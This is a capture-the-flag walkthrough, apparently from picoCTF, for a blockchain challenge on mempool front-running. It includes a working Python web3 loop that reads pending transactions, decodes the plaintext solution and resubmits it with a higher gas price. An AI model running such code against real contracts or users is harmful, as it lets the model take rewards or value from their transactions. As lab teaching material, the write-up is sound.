# FRONT RUNNING PROBLEM GUIDE:

*(Blockchain — Medium, 300pt)*

## HINTS:
Hint 1: Look at pending transactions in the mempool.
Hint 2: What happens if two people submit the answer in the same block?
Hint 3: How do you see what's waiting to be mined?

## TOOLS:
`web3.py` (mempool monitoring, `decode_function_input`)

## WALKTHROUGH:
1. `MempoolChallenge.sol`: `solve(solution)` requires `keccak256(solution) == targetHash` **and** `msg.sender == studentAddress`. A victim bot keeps submitting the correct `solution` with a low gas price.

2. You can't reverse the hash, but the victim's pending tx exposes the plaintext `solution` in the mempool. Watch pending txs, decode the input, and resubmit with higher gas to be mined first:
```python
while True:
    for tx in w3.eth.get_block('pending', full_transactions=True)['transactions']:
        if tx['to'] and tx['to'].lower() == CONTRACT.lower():
            _, params = c.decode_function_input(tx['input'])
            sol = params['solution']
            fast = int(tx['gasPrice'] * 1.5)
            t = c.functions.solve(sol).build_transaction({'from':ME,'gas':200000,
                'gasPrice':fast,'nonce':w3.eth.get_transaction_count(ME)})
            s = w3.eth.account.sign_transaction(t, PRIV)
            w3.eth.send_raw_transaction(s.raw_transaction); raise SystemExit
    time.sleep(2)
```
    - Flag shows on the challenge status page (note: the `solution` looks like a flag but the real flag is the one revealed to you).
        - Answer: `picoCTF{...}` (instance-specific)

## NOTES:
- The mempool is public — anything "pending" is readable before it's mined, including function arguments.
- Higher gas price = mined sooner. That's front-running: same answer, but your tx wins the block.
